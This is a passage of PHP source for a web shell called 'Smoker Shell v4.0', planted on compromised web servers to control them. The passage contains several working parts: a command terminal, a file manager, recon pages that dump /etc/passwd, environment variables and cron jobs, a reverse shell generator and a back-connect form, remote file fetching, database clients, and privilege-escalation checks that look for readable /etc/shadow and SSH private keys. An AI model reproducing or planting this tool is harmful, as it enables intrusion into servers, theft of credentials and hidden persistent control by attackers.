                        $ascii .= ($byte >= 32 && $byte <= 126) ? htmlspecialchars($hdata[$i+$j]) : '.';
                    } else {
                        $hex .= '   '; $ascii .= ' ';
                    }
                    if ($j === 7) $hex .= ' ';
                }
                echo '<span class="offset">' . sprintf('%08x', $i) . '</span>  <span class="byte">' . $hex . '</span> <span class="ascii">|' . $ascii . '|</span>' . "\n";
            }
        ?></div>
        <div style="margin-top:10px"><a class="btn" href="?p=files&d=<?= urlencode($dir) ?>">Back</a></div>

    <?php elseif ($viewing): $vf = $_GET['view']; ?>
        <div style="margin-bottom:10px;color:var(--cyan);font-size:11px">Viewing: <?= htmlspecialchars($vf) ?> (<?= fmt_bytes(filesize($vf)) ?>)</div>
        <textarea readonly style="height:350px;font-size:12px;line-height:1.5;color:var(--accent)"><?= htmlspecialchars(@file_get_contents($vf)) ?></textarea>
        <div style="margin-top:10px;display:flex;gap:8px">
            <a class="btn" href="?p=files&d=<?= urlencode($dir) ?>">Back</a>
            <a class="btn" href="?p=files&d=<?= urlencode($dir) ?>&edit=<?= urlencode($vf) ?>">Edit</a>
            <a class="btn" href="?dl=<?= urlencode($vf) ?>">Download</a>
            <a class="btn" href="?p=files&d=<?= urlencode($dir) ?>&hex=<?= urlencode($vf) ?>">Hex View</a>
        </div>

    <?php else: ?>
        <!-- Create new / Chmod -->
        <div style="display:flex;gap:16px;margin-bottom:16px;flex-wrap:wrap">
            <form method="post" style="display:flex;gap:6px;align-items:center">
                <input type="text" name="create_name" placeholder="Name" style="width:150px">
                <select name="create_type"><option value="file">File</option><option value="dir">Directory</option></select>
                <button class="btn btn-sm" type="submit">Create</button>
            </form>
            <form method="post" style="display:flex;gap:6px;align-items:center">
                <input type="text" name="chmod_file" placeholder="File path" style="width:200px">
                <input type="text" name="chmod_val" placeholder="0755" style="width:60px">
                <button class="btn btn-sm" type="submit">chmod</button>
            </form>
            <form method="post" style="display:flex;gap:6px;align-items:center">
                <input type="text" name="rename_from" placeholder="From" style="width:150px">
                <input type="text" name="rename_to" placeholder="To" style="width:150px">
                <button class="btn btn-sm" type="submit">Rename</button>
            </form>
        </div>

        <table class="tbl">
        <tr><th>Name</th><th>Size</th><th>Permissions</th><th>Modified</th><th>Actions</th></tr>
        <?php
        if ($dir !== '/') {
            $parent = dirname($dir);
            echo '<tr><td><a href="?p=files&d=' . urlencode($parent) . '">⬆ ..</a></td><td>—</td><td>—</td><td>—</td><td>—</td></tr>';
        }
        $items = @scandir($dir);
        if ($items) {
            $dirs_arr = $files_arr = [];
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                $full = $dir . '/' . $item;
                if (is_dir($full)) $dirs_arr[] = $item;
                else $files_arr[] = $item;
            }
            sort($dirs_arr); sort($files_arr);

            foreach ($dirs_arr as $d_item) {
                $full = $dir . '/' . $d_item;
                $perms = @fmt_perms($full);
                $octal = @fmt_octal($full);
                $mod = @date('Y-m-d H:i', filemtime($full));
                echo '<tr>';
                echo '<td><a href="?p=files&d=' . urlencode($full) . '">📁 ' . htmlspecialchars($d_item) . '/</a></td>';
                echo '<td style="color:var(--text2)">—</td>';
                echo '<td style="font-size:11px">' . $perms . ' <span style="color:var(--text2)">(' . $octal . ')</span></td>';
                echo '<td style="color:var(--text2);font-size:11px">' . $mod . '</td>';
                echo '<td><a class="btn btn-sm btn-red" href="?p=files&d=' . urlencode($dir) . '&delete=dir&file=' . urlencode($full) . '" onclick="return confirm(\'Delete directory?\')">Del</a></td>';
                echo '</tr>';
            }

            foreach ($files_arr as $f_item) {
                $full = $dir . '/' . $f_item;
                $size = @filesize($full);
                $perms = @fmt_perms($full);
                $octal = @fmt_octal($full);
                $mod = @date('Y-m-d H:i', filemtime($full));
                echo '<tr>';
                echo '<td><a href="?p=files&d=' . urlencode($dir) . '&view=' . urlencode($full) . '">📄 ' . htmlspecialchars($f_item) . '</a></td>';
                echo '<td>' . fmt_bytes($size) . '</td>';
                echo '<td style="font-size:11px">' . $perms . ' <span style="color:var(--text2)">(' . $octal . ')</span></td>';
                echo '<td style="color:var(--text2);font-size:11px">' . $mod . '</td>';
                echo '<td style="display:flex;gap:4px">';
                echo '<a class="btn btn-sm" href="?p=files&d=' . urlencode($dir) . '&edit=' . urlencode($full) . '">Edit</a>';
                echo '<a class="btn btn-sm" href="?dl=' . urlencode($full) . '">DL</a>';
                echo '<a class="btn btn-sm" href="?p=files&d=' . urlencode($dir) . '&hex=' . urlencode($full) . '">Hex</a>';
                echo '<a class="btn btn-sm btn-red" href="?p=files&d=' . urlencode($dir) . '&delete=file&file=' . urlencode($full) . '" onclick="return confirm(\'Delete?\')">Del</a>';
                echo '</td></tr>';
            }
        } else {
            echo '<tr><td colspan="5" style="text-align:center;color:var(--text2)">Cannot read directory</td></tr>';
        }
        ?>
        </table>
    <?php endif; ?>
    </div>
</div>

<?php
// ============================================================
//  TERMINAL
// ============================================================
elseif ($page === 'terminal'): ?>

<div class="terminal">
    <div class="terminal-head">
        <span class="dot" style="background:var(--red)"></span>
        <span class="dot" style="background:var(--yellow)"></span>
        <span class="dot" style="background:var(--accent)"></span>
        <span style="color:var(--text2);font-size:11px;margin-left:8px"><?= $sys_info['user'] ?>@<?= $sys_info['hostname'] ?>:<?= htmlspecialchars($dir) ?></span>
    </div>
    <div class="terminal-body" id="termOutput"><?php
        if (isset($_SESSION['cmd_output'])) {
            echo htmlspecialchars($_SESSION['cmd_output']);
            unset($_SESSION['cmd_output']);
        } else {
            echo "Welcome to Smoker Shell v4.0\nType commands below.\n\nAvailable exec methods: " . implode(', ', $sys_info['exec_methods']) . "\n";
        }
    ?></div>
    <form method="post" class="terminal-input">
        <span><?= $sys_info['user'] ?>@<?= $sys_info['hostname'] ?>:$ </span>
        <input type="text" name="cmd" autofocus autocomplete="off" placeholder="Enter command..." id="cmdInput">
    </form>
</div>

<?php if (!empty($_SESSION['cmd_history'])): ?>
<div class="panel" style="margin-top:16px">
    <div class="panel-head"><h3>Command History</h3></div>
    <div class="panel-body">
        <?php foreach (array_slice($_SESSION['cmd_history'], 0, 20) as $i => $cmd): ?>
        <div style="padding:4px 0;font-size:11px;color:var(--text2)">
            <span style="color:var(--text2)"><?= $i + 1 ?>.</span>
            <a href="#" onclick="document.getElementById('cmdInput').value='<?= htmlspecialchars(addslashes($cmd)) ?>';return false" style="color:var(--cyan)"><?= htmlspecialchars($cmd) ?></a>
        </div>
        <?php endforeach; ?>
    </div>
</div>
<?php endif; ?>

<?php
// ============================================================
//  SYSTEM RECON
// ============================================================
elseif ($page === 'recon'): ?>

<div class="tabs" id="reconTabs">
    <div class="tab active" data-tab="recon-sys">System</div>
    <div class="tab" data-tab="recon-php">PHP Info</div>
    <div class="tab" data-tab="recon-users">Users</div>
    <div class="tab" data-tab="recon-proc">Processes</div>
    <div class="tab" data-tab="recon-cron">Cron Jobs</div>
    <div class="tab" data-tab="recon-env">Environment</div>
    <div class="tab" data-tab="recon-net">Interfaces</div>
</div>

<div class="tab-content active" id="recon-sys">
    <div class="panel"><div class="panel-head"><h3>Full System Info</h3></div><div class="panel-body">
        <table class="tbl">
        <tr><td style="color:var(--text2);width:160px">Full Uname</td><td style="word-break:break-all"><?= htmlspecialchars(php_uname()) ?></td></tr>
        <tr><td style="color:var(--text2)">Hostname</td><td><?= htmlspecialchars($sys_info['hostname']) ?></td></tr>
        <tr><td style="color:var(--text2)">Kernel</td><td><?= htmlspecialchars($sys_info['kernel']) ?></td></tr>
        <tr><td style="color:var(--text2)">Architecture</td><td><?= htmlspecialchars($sys_info['arch']) ?></td></tr>
        <tr><td style="color:var(--text2)">Server Software</td><td><?= htmlspecialchars($sys_info['server']) ?></td></tr>
        <tr><td style="color:var(--text2)">Server IP</td><td><?= $_SERVER['SERVER_ADDR'] ?? run_cmd('hostname -I 2>/dev/null') ?></td></tr>
        <tr><td style="color:var(--text2)">Client IP</td><td><?= $_SERVER['REMOTE_ADDR'] ?? 'Unknown' ?></td></tr>
        <tr><td style="color:var(--text2)">Uptime</td><td><?= htmlspecialchars(trim(run_cmd('uptime 2>/dev/null'))) ?></td></tr>
        <tr><td style="color:var(--text2)">Disk Free</td><td><?= $sys_info['disk_free'] ?> / <?= $sys_info['disk_total'] ?></td></tr>
        <?php
        $cpu = @file_get_contents('/proc/cpuinfo');
        if ($cpu && preg_match('/model name\s*:\s*(.+)/i', $cpu, $m)):
        ?>
        <tr><td style="color:var(--text2)">CPU</td><td><?= htmlspecialchars(trim($m[1])) ?></td></tr>
        <?php endif;
        $mem = @file_get_contents('/proc/meminfo');
        if ($mem && preg_match('/MemTotal:\s*(\d+)/i', $mem, $m)):
        ?>
        <tr><td style="color:var(--text2)">Total RAM</td><td><?= fmt_bytes($m[1] * 1024) ?></td></tr>
        <?php endif; ?>
        <tr><td style="color:var(--text2)">Mounted FS</td><td><pre style="font-size:10px;color:var(--text2);margin:0;white-space:pre-wrap"><?= htmlspecialchars(trim(run_cmd('df -h 2>/dev/null'))) ?></pre></td></tr>
        </table>
    </div></div>
</div>

<div class="tab-content" id="recon-php">
    <div class="panel"><div class="panel-head"><h3>PHP Configuration</h3></div><div class="panel-body">
        <table class="tbl">
        <tr><td style="color:var(--text2);width:160px">Version</td><td><?= phpversion() ?></td></tr>
        <tr><td style="color:var(--text2)">SAPI</td><td><?= php_sapi_name() ?></td></tr>
        <tr><td style="color:var(--text2)">Disabled Functions</td><td style="word-break:break-all;font-size:10px"><?= htmlspecialchars($sys_info['disabled']) ?></td></tr>
        <tr><td style="color:var(--text2)">Open Basedir</td><td><?= htmlspecialchars($sys_info['open_basedir']) ?></td></tr>
        <tr><td style="color:var(--text2)">Memory Limit</td><td><?= ini_get('memory_limit') ?></td></tr>
        <tr><td style="color:var(--text2)">Upload Max</td><td><?= ini_get('upload_max_filesize') ?></td></tr>
        <tr><td style="color:var(--text2)">POST Max</td><td><?= ini_get('post_max_size') ?></td></tr>
        <tr><td style="color:var(--text2)">Include Path</td><td style="word-break:break-all;font-size:10px"><?= htmlspecialchars(ini_get('include_path')) ?></td></tr>
        <tr><td style="color:var(--text2)">Error Reporting</td><td><?= ini_get('error_reporting') ?></td></tr>
        <tr><td style="color:var(--text2)">Loaded Extensions</td><td style="font-size:10px"><?php
            $exts = get_loaded_extensions();
            sort($exts);
            foreach ($exts as $ext) echo '<span class="badge badge-cyan" style="margin:1px">' . $ext . '</span> ';
        ?></td></tr>
        </table>
    </div></div>
</div>

<div class="tab-content" id="recon-users">
    <div class="panel"><div class="panel-head"><h3>System Users</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.6;white-space:pre-wrap"><?php
            $passwd = @file_get_contents('/etc/passwd');
            echo $passwd ? htmlspecialchars($passwd) : htmlspecialchars(run_cmd('cat /etc/passwd 2>/dev/null'));
        ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>Groups</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.6;white-space:pre-wrap"><?= htmlspecialchars(trim(run_cmd('id 2>/dev/null'))) ?>

<?= htmlspecialchars(trim(run_cmd('groups 2>/dev/null'))) ?></pre>
    </div></div>
</div>

<div class="tab-content" id="recon-proc">
    <div class="panel"><div class="panel-head"><h3>Running Processes</h3></div><div class="panel-body">
        <pre style="font-size:10px;color:var(--text);line-height:1.5;white-space:pre-wrap;max-height:500px;overflow-y:auto"><?= htmlspecialchars(trim(run_cmd('ps aux 2>/dev/null'))) ?></pre>
    </div></div>
</div>

<div class="tab-content" id="recon-cron">
    <div class="panel"><div class="panel-head"><h3>Cron Jobs</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.6;white-space:pre-wrap"><?php
            $cron = '';
            $cron .= "=== Current User Crontab ===\n" . trim(run_cmd('crontab -l 2>/dev/null')) . "\n\n";
            $cron .= "=== /etc/crontab ===\n" . htmlspecialchars(@file_get_contents('/etc/crontab') ?: run_cmd('cat /etc/crontab 2>/dev/null')) . "\n\n";
            $cron .= "=== /etc/cron.d/ ===\n" . trim(run_cmd('ls -la /etc/cron.d/ 2>/dev/null')) . "\n\n";
            $cron .= "=== Cron Directories ===\n";
            foreach (['/etc/cron.daily','/etc/cron.hourly','/etc/cron.weekly','/etc/cron.monthly'] as $cd) {
                $cron .= "\n$cd:\n" . trim(run_cmd("ls -la $cd 2>/dev/null")) . "\n";
            }
            echo $cron;
        ?></pre>
    </div></div>
</div>

<div class="tab-content" id="recon-env">
    <div class="panel"><div class="panel-head"><h3>Environment Variables</h3></div><div class="panel-body">
        <table class="tbl">
        <?php
        $env = $_SERVER + ($_ENV ?? []);
        ksort($env);
        foreach ($env as $k => $v):
            if (is_string($v)):
        ?>
        <tr><td style="color:var(--cyan);width:200px;font-size:10px"><?= htmlspecialchars($k) ?></td><td style="word-break:break-all;font-size:10px"><?= htmlspecialchars(substr($v, 0, 500)) ?></td></tr>
        <?php endif; endforeach; ?>
        </table>
    </div></div>
</div>

<div class="tab-content" id="recon-net">
    <div class="panel"><div class="panel-head"><h3>Network Interfaces</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.5;white-space:pre-wrap"><?= htmlspecialchars(trim(run_cmd('ip addr 2>/dev/null || ifconfig 2>/dev/null'))) ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>Listening Ports</h3></div><div class="panel-body">
        <pre style="font-size:10px;color:var(--text);line-height:1.5;white-space:pre-wrap"><?= htmlspecialchars(trim(run_cmd('ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null'))) ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>Routing Table</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.5;white-space:pre-wrap"><?= htmlspecialchars(trim(run_cmd('ip route 2>/dev/null || route -n 2>/dev/null'))) ?></pre>
    </div></div>
</div>

<?php
// ============================================================
//  NETWORK TOOLS
// ============================================================
elseif ($page === 'network'): ?>

<div class="tabs" id="netTabs">
    <div class="tab active" data-tab="net-scan">Port Scanner</div>
    <div class="tab" data-tab="net-revshell">Reverse Shell Gen</div>
    <div class="tab" data-tab="net-connect">Back Connect</div>
    <div class="tab" data-tab="net-fetch">Fetch URL</div>
    <div class="tab" data-tab="net-dns">DNS Lookup</div>
</div>

<div class="tab-content active" id="net-scan">
    <div class="panel"><div class="panel-head"><h3>TCP Port Scanner</h3></div><div class="panel-body">
        <form method="post">
            <div class="form-row"><label>Host</label><input type="text" name="scan_host" value="<?= htmlspecialchars($_POST['scan_host'] ?? '127.0.0.1') ?>" style="width:200px"></div>
            <div class="form-row"><label>Ports</label><input type="text" name="scan_ports" value="<?= htmlspecialchars($_POST['scan_ports'] ?? '21,22,23,25,53,80,110,143,443,445,993,995,3306,3389,5432,6379,8080,8443,27017') ?>" style="width:400px"><span style="color:var(--text2);font-size:10px">comma-separated or range (1-1024)</span></div>
            <div class="form-row"><label>Timeout</label><input type="text" name="scan_timeout" value="<?= htmlspecialchars($_POST['scan_timeout'] ?? '1') ?>" style="width:60px"><span style="color:var(--text2);font-size:10px">seconds</span></div>
            <button class="btn btn-green" type="submit">Scan</button>
        </form>
        <?php if (!empty($_SESSION['scan_results'])): ?>
        <table class="tbl" style="margin-top:16px">
            <tr><th>Port</th><th>Status</th><th>Service (common)</th></tr>
            <?php
            $services = [21=>'FTP',22=>'SSH',23=>'Telnet',25=>'SMTP',53=>'DNS',80=>'HTTP',110=>'POP3',143=>'IMAP',443=>'HTTPS',445=>'SMB',993=>'IMAPS',995=>'POP3S',3306=>'MySQL',3389=>'RDP',5432=>'PostgreSQL',6379=>'Redis',8080=>'HTTP-Alt',8443=>'HTTPS-Alt',27017=>'MongoDB'];
            foreach ($_SESSION['scan_results'] as $port => $status):
            ?>
            <tr>
                <td><?= $port ?></td>
                <td><span class="<?= $status === 'open' ? 'open' : 'closed' ?>"><?= $status ?></span></td>
                <td style="color:var(--text2)"><?= $services[$port] ?? '—' ?></td>
            </tr>
            <?php endforeach; unset($_SESSION['scan_results']); ?>
        </table>
        <?php endif; ?>
    </div></div>
</div>

<div class="tab-content" id="net-revshell">
    <div class="panel"><div class="panel-head"><h3>Reverse Shell Generator</h3></div><div class="panel-body">
        <div class="form-row"><label>LHOST</label><input type="text" id="rs_ip" value="<?= $_SERVER['REMOTE_ADDR'] ?? '10.0.0.1' ?>" style="width:200px"></div>
        <div class="form-row"><label>LPORT</label><input type="text" id="rs_port" value="4444" style="width:100px"></div>
        <div class="form-row"><label>Type</label>
            <select id="rs_type" onchange="generateShell()">
                <option value="bash">Bash</option>
                <option value="bash2">Bash (alt)</option>
                <option value="php">PHP</option>
                <option value="python">Python</option>
                <option value="python3">Python3</option>
                <option value="perl">Perl</option>
                <option value="ruby">Ruby</option>
                <option value="nc">Netcat</option>
                <option value="nce">Netcat (-e)</option>
                <option value="powershell">PowerShell</option>
                <option value="socat">Socat</option>
            </select>
            <button class="btn btn-sm" onclick="generateShell()">Generate</button>
        </div>
        <textarea id="rs_output" readonly style="height:100px;color:var(--accent);margin-top:10px;font-size:12px"></textarea>
        <button class="btn btn-sm" style="margin-top:8px" onclick="navigator.clipboard.writeText(document.getElementById('rs_output').value)">Copy to Clipboard</button>
    </div></div>
</div>

<div class="tab-content" id="net-connect">
    <div class="panel"><div class="panel-head"><h3>Back Connect</h3></div><div class="panel-body">
        <form method="post">
            <div class="form-row"><label>IP</label><input type="text" name="bc_ip" value="<?= $_SERVER['REMOTE_ADDR'] ?? '' ?>" style="width:200px"></div>
            <div class="form-row"><label>Port</label><input type="text" name="bc_port" value="4444" style="width:100px"></div>
            <div class="form-row"><label>Method</label>
                <select name="bc_method">
                    <option value="bash">Bash</option>
                    <option value="php">PHP (fsockopen)</option>
                    <option value="python">Python</option>
                    <option value="perl">Perl</option>
                    <option value="nc">Netcat</option>
                </select>
            </div>
            <button class="btn btn-red" type="submit" onclick="return confirm('Initiate reverse shell?')">Connect Back</button>
        </form>
    </div></div>
</div>

<div class="tab-content" id="net-fetch">
    <div class="panel"><div class="panel-head"><h3>Fetch Remote File</h3></div><div class="panel-body">
        <form method="post">
            <div class="form-row"><label>URL</label><input type="text" name="fetch_url" placeholder="https://example.com/file.bin" style="width:400px"></div>
            <div class="form-row"><label>Save As</label><input type="text" name="fetch_saveas" placeholder="(auto from URL)" style="width:200px"></div>
            <div class="form-row"><label>Save To</label><span style="color:var(--cyan);font-size:11px"><?= htmlspecialchars($dir) ?>/</span></div>
            <button class="btn btn-green" type="submit">Download</button>
        </form>
    </div></div>
</div>

<div class="tab-content" id="net-dns">
    <div class="panel"><div class="panel-head"><h3>DNS Lookup</h3></div><div class="panel-body">
        <form method="get">
            <input type="hidden" name="p" value="network">
            <div class="form-row"><label>Host</label><input type="text" name="dns" value="<?= htmlspecialchars($_GET['dns'] ?? '') ?>" style="width:300px" placeholder="example.com"></div>
            <button class="btn btn-green" type="submit">Lookup</button>
        </form>
        <?php if (isset($_GET['dns']) && $_GET['dns'] !== ''): $host = $_GET['dns']; ?>
        <div style="margin-top:16px">
            <table class="tbl">
                <tr><td style="color:var(--text2);width:120px">gethostbyname</td><td><?= htmlspecialchars(@gethostbyname($host)) ?></td></tr>
                <?php if (function_exists('dns_get_record')):
                    $records = @dns_get_record($host, DNS_ALL);
                    if ($records): foreach ($records as $rec): ?>
                <tr><td style="color:var(--text2)"><?= $rec['type'] ?></td><td style="font-size:11px"><?= htmlspecialchars(json_encode($rec, JSON_UNESCAPED_SLASHES)) ?></td></tr>
                <?php endforeach; endif; endif; ?>
            </table>
            <div style="margin-top:12px">
                <h4 style="color:var(--accent);font-size:11px;margin-bottom:8px">DIG OUTPUT</h4>
                <pre style="font-size:10px;color:var(--text);line-height:1.5;white-space:pre-wrap"><?= htmlspecialchars(trim(run_cmd('dig ' . escapeshellarg($host) . ' ANY +noall +answer 2>/dev/null || nslookup ' . escapeshellarg($host) . ' 2>/dev/null'))) ?></pre>
            </div>
        </div>
        <?php endif; ?>
    </div></div>
</div>

<?php
// ============================================================
//  DATABASE
// ============================================================
elseif ($page === 'database'): ?>

<div class="tabs" id="dbTabs">
    <div class="tab active" data-tab="db-mysql">MySQL</div>
    <div class="tab" data-tab="db-sqlite">SQLite</div>
</div>

<div class="tab-content active" id="db-mysql">
    <div class="panel"><div class="panel-head"><h3>MySQL Client</h3>
        <?php if (!function_exists('mysqli_connect')): ?><span class="badge badge-red">mysqli not available</span><?php endif; ?>
    </div><div class="panel-body">
        <form method="post">
            <input type="hidden" name="db_type" value="mysql">
            <div class="form-row"><label>Host</label><input type="text" name="db_host" value="<?= htmlspecialchars($_POST['db_host'] ?? 'localhost') ?>" style="width:200px"></div>
            <div class="form-row"><label>Port</label><input type="text" name="db_port" value="<?= htmlspecialchars($_POST['db_port'] ?? '3306') ?>" style="width:80px"></div>
            <div class="form-row"><label>User</label><input type="text" name="db_user" value="<?= htmlspecialchars($_POST['db_user'] ?? 'root') ?>" style="width:150px"></div>
            <div class="form-row"><label>Password</label><input type="text" name="db_pass" value="" style="width:150px" placeholder="password"></div>
            <div class="form-row"><label>Database</label><input type="text" name="db_name" value="<?= htmlspecialchars($_POST['db_name'] ?? '') ?>" style="width:150px" placeholder="(optional)"></div>
            <div class="form-row"><label>Query</label></div>
            <textarea name="db_query" style="height:80px" placeholder="SHOW DATABASES; / SELECT * FROM users LIMIT 10;"><?= htmlspecialchars($_SESSION['db_query_text'] ?? '') ?></textarea>
            <button class="btn btn-green" type="submit" style="margin-top:10px">Execute</button>
        </form>
    </div></div>
</div>

<div class="tab-content" id="db-sqlite">
    <div class="panel"><div class="panel-head"><h3>SQLite Client</h3>
        <?php if (!class_exists('SQLite3')): ?><span class="badge badge-red">SQLite3 not available</span><?php endif; ?>
    </div><div class="panel-body">
        <form method="post">
            <input type="hidden" name="db_type" value="sqlite">
            <div class="form-row"><label>DB File</label><input type="text" name="db_file" value="<?= htmlspecialchars($_POST['db_file'] ?? '') ?>" style="width:400px" placeholder="/path/to/database.db"></div>
            <div class="form-row"><label>Query</label></div>
            <textarea name="db_query" style="height:80px" placeholder="SELECT name FROM sqlite_master WHERE type='table';"><?= htmlspecialchars($_SESSION['db_query_text'] ?? '') ?></textarea>
            <button class="btn btn-green" type="submit" style="margin-top:10px">Execute</button>
        </form>
    </div></div>
</div>

<?php if (!empty($_SESSION['db_error'])): ?>
<div class="msg msg-err" style="margin-top:16px"><?= htmlspecialchars($_SESSION['db_error']) ?></div>
<?php unset($_SESSION['db_error']); endif; ?>

<?php if (!empty($_SESSION['db_result'])): ?>
<div class="panel" style="margin-top:16px"><div class="panel-head"><h3>Results (<?= count($_SESSION['db_result']) ?> rows)</h3></div><div class="panel-body" style="overflow-x:auto">
    <?php if ($_SESSION['db_result']): ?>
    <table class="tbl">
        <tr><?php foreach (array_keys($_SESSION['db_result'][0]) as $col): ?><th><?= htmlspecialchars($col) ?></th><?php endforeach; ?></tr>
        <?php foreach ($_SESSION['db_result'] as $row): ?>
        <tr><?php foreach ($row as $val): ?><td style="font-size:11px"><?= htmlspecialchars($val ?? 'NULL') ?></td><?php endforeach; ?></tr>
        <?php endforeach; ?>
    </table>
    <?php else: ?>
    <div style="color:var(--text2)">No results returned.</div>
    <?php endif; ?>
</div></div>
<?php unset($_SESSION['db_result']); unset($_SESSION['db_query_text']); endif; ?>

<?php
// ============================================================
//  PRIVILEGE ESCALATION
// ============================================================
elseif ($page === 'privesc'): ?>

<div class="tabs" id="privTabs">
    <div class="tab active" data-tab="priv-suid">SUID/SGID</div>
    <div class="tab" data-tab="priv-writable">Writable Dirs</div>
    <div class="tab" data-tab="priv-caps">Capabilities</div>
    <div class="tab" data-tab="priv-kernel">Kernel Exploits</div>
    <div class="tab" data-tab="priv-sudo">Sudo / Misc</div>
</div>

<div class="tab-content active" id="priv-suid">
    <div class="panel"><div class="panel-head"><h3>SUID Binaries</h3><span class="badge badge-yellow">Potential privilege escalation vectors</span></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.8;white-space:pre-wrap;max-height:400px;overflow-y:auto"><?= htmlspecialchars(trim(run_cmd('find / -perm -4000 -type f 2>/dev/null | head -50'))) ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>SGID Binaries</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.8;white-space:pre-wrap;max-height:300px;overflow-y:auto"><?= htmlspecialchars(trim(run_cmd('find / -perm -2000 -type f 2>/dev/null | head -50'))) ?></pre>
    </div></div>
</div>

<div class="tab-content" id="priv-writable">
    <div class="panel"><div class="panel-head"><h3>World-Writable Directories</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.8;white-space:pre-wrap;max-height:400px;overflow-y:auto"><?= htmlspecialchars(trim(run_cmd('find / -writable -type d 2>/dev/null | head -50'))) ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>Writable Files in /etc/</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.8;white-space:pre-wrap;max-height:300px;overflow-y:auto"><?= htmlspecialchars(trim(run_cmd('find /etc -writable -type f 2>/dev/null | head -30'))) ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>Writable PATH Directories</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.8;white-space:pre-wrap"><?php
            $path_dirs = explode(':', getenv('PATH') ?: '/usr/local/bin:/usr/bin:/bin');
            foreach ($path_dirs as $pd) {
                $writable = is_writable($pd) ? '  [WRITABLE]' : '';
                $color = $writable ? 'var(--accent)' : 'var(--text2)';
                echo '<span style="color:' . $color . '">' . htmlspecialchars($pd) . $writable . "</span>\n";
            }
        ?></pre>
    </div></div>
</div>

<div class="tab-content" id="priv-caps">
    <div class="panel"><div class="panel-head"><h3>Linux Capabilities</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.8;white-space:pre-wrap;max-height:400px;overflow-y:auto"><?= htmlspecialchars(trim(run_cmd('getcap -r / 2>/dev/null | head -50'))) ?: '<span style="color:var(--text2)">getcap not available or no capabilities found</span>' ?></pre>
    </div></div>
</div>

<div class="tab-content" id="priv-kernel">
    <div class="panel"><div class="panel-head"><h3>Kernel Information</h3></div><div class="panel-body">
        <table class="tbl">
            <tr><td style="color:var(--text2);width:140px">Kernel</td><td><?= htmlspecialchars(php_uname('r')) ?></td></tr>
            <tr><td style="color:var(--text2)">OS</td><td><?= htmlspecialchars(php_uname('s')) ?></td></tr>
            <tr><td style="color:var(--text2)">Architecture</td><td><?= htmlspecialchars(php_uname('m')) ?></td></tr>
            <tr><td style="color:var(--text2)">Distribution</td><td><pre style="font-size:10px;margin:0;white-space:pre-wrap"><?= htmlspecialchars(trim(run_cmd('cat /etc/*release 2>/dev/null | head -10'))) ?></pre></td></tr>
        </table>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>Common Kernel Exploit Checks</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.8;white-space:pre-wrap"><?php
            $kernel = php_uname('r');
            $exploits = [
                'DirtyPipe (CVE-2022-0847)' => version_compare($kernel, '5.8', '>=') && version_compare($kernel, '5.16.11', '<'),
                'DirtyCow (CVE-2016-5195)' => version_compare($kernel, '2.6.22', '>=') && version_compare($kernel, '4.8.3', '<'),
                'PwnKit (CVE-2021-4034)' => true,
                'Baron Samedit (CVE-2021-3156)' => true,
                'Looney Tunables (CVE-2023-4911)' => true,
            ];
            foreach ($exploits as $name => $possible) {
                $color = $possible ? 'var(--yellow)' : 'var(--text2)';
                $tag = $possible ? '[POSSIBLY VULNERABLE]' : '[LIKELY NOT VULNERABLE]';
                echo "<span style=\"color:$color\">$name: $tag</span>\n";
            }
            echo "\nNote: These are heuristic checks based on kernel version only.\nAlways verify manually with dedicated exploit-check tools.";
        ?></pre>
    </div></div>
</div>

<div class="tab-content" id="priv-sudo">
    <div class="panel"><div class="panel-head"><h3>Sudo Permissions</h3></div><div class="panel-body">
        <pre style="font-size:11px;color:var(--text);line-height:1.8;white-space:pre-wrap"><?= htmlspecialchars(trim(run_cmd('sudo -l 2>/dev/null'))) ?: '<span style="color:var(--text2)">sudo -l not available (may require password)</span>' ?></pre>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>Container Detection</h3></div><div class="panel-body">
        <table class="tbl">
            <?php
            $docker = file_exists('/.dockerenv') || strpos(@file_get_contents('/proc/1/cgroup'), 'docker') !== false;
            $lxc = strpos(@file_get_contents('/proc/1/environ'), 'container=lxc') !== false;
            $k8s = !empty(getenv('KUBERNETES_SERVICE_HOST'));
            ?>
            <tr><td style="color:var(--text2);width:140px">Docker</td><td><span class="badge <?= $docker ? 'badge-yellow' : 'badge-green' ?>"><?= $docker ? 'Detected' : 'Not detected' ?></span></td></tr>
            <tr><td style="color:var(--text2)">LXC/LXD</td><td><span class="badge <?= $lxc ? 'badge-yellow' : 'badge-green' ?>"><?= $lxc ? 'Detected' : 'Not detected' ?></span></td></tr>
            <tr><td style="color:var(--text2)">Kubernetes</td><td><span class="badge <?= $k8s ? 'badge-yellow' : 'badge-green' ?>"><?= $k8s ? 'Detected' : 'Not detected' ?></span></td></tr>
        </table>
    </div></div>
    <div class="panel"><div class="panel-head"><h3>Sensitive Files Readable</h3></div><div class="panel-body">
        <table class="tbl">
            <?php
            $sensitive = ['/etc/shadow','/etc/sudoers','/root/.bash_history','/root/.ssh/id_rsa','/etc/mysql/debian.cnf','/var/www/.env','/proc/self/environ'];
            foreach ($sensitive as $sf):
                $readable = is_readable($sf);
            ?>
            <tr>
                <td style="font-size:11px"><?= htmlspecialchars($sf) ?></td>
